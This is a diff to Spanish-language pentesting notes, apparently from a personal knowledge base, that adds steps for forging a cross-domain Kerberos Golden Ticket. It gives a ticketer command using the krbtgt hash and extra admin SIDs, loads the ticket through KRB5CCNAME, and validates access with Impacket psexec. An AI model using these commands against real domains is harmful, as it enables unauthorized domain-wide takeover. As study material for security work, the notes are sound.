@@ -48,4 +48,17 @@ Para obtener el `SID` usaremos la misma herramienta que antes [[IMPACKET]]
 
 ## Golden Ticket
 ### Explotación -> TICKETER
-Usaremos la herramienta [[TICKETER]]
+Usaremos la herramienta [[TICKETER]] para construir el `Golden Ticket`
+
+```shell
+ticketer -nthash <hash.KRBTGT> -domain <dominio.secundario> -domain-sid <SID.scecundario> -extra-sid <SIS.admins> <user>
+```
+
+Se nos guardara en un archivo llamado `user.ccache`, este archivo lo tendremos que añadir en la variable de entorno `KRB5CCNAME` con el comando
+
+```shell
+export KRB5CCNAME=user.ccache
+```
+
+### Validación de crecenciales
+Validaremos las credenciales con [[IMPACKET]] usando `psexec`
